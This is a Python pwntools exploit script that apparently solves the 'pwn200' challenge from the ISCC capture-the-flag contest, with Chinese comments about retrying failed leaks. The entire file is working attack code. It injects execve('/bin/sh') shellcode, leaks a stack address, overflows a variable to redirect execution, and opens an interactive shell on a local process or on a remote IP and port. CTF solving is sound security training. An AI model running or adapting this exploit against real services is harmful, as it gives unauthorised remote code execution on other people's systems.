#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

fn = './pwn200'
shellcode = 'jhH\xb8/bin///sPj;XH\x89\xe71\xf6\x99\x0f\x05'

if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('47.104.16.75', 8997)

log.info('TODO: To leak stack address ...')

io.sendafter('u?\n', shellcode.ljust(48, '@'))
io.recv(48)
data = io.recvuntil(', welcome to ISCC~ ', drop=True)
if len(data) != 6:
    # 正好遇到了地址中间存在00的情况。多试几次就好
    log.error('Cannot leak stack address. Please try again.')
    exit(-1)
stack_addr = u64(data.ljust(8, '\x00'))
log.success('stack_addr = %s', hex(stack_addr))
shellcode_addr = stack_addr - (0x7fffa14ab8e0 - 0x7fffa14ab890)
log.success('shellcode_addr = %s', hex(shellcode_addr))

jmp_shellcode_addr = stack_addr - (0x7ffe3028bb50 - 0x7ffe3028bad8)
log.debug('jmp_shellcode_addr = %s', hex(jmp_shellcode_addr))

log.info('varible overflow to a stack adress')

io.recvuntil('give me your id ~~?\n')
io.send('0000')

io.recvuntil('give me money~\n')

# shellcode地址中间存在00的情况。多试几次就好
assert'\x00' not in p64(shellcode_addr)[:6]

payload = ''.join([
    p64(shellcode_addr) * 7,
    p64(jmp_shellcode_addr),  # dest的地址
])

io.send(payload)

io.sendlineafter('your choice : ', '3')

io.interactive()
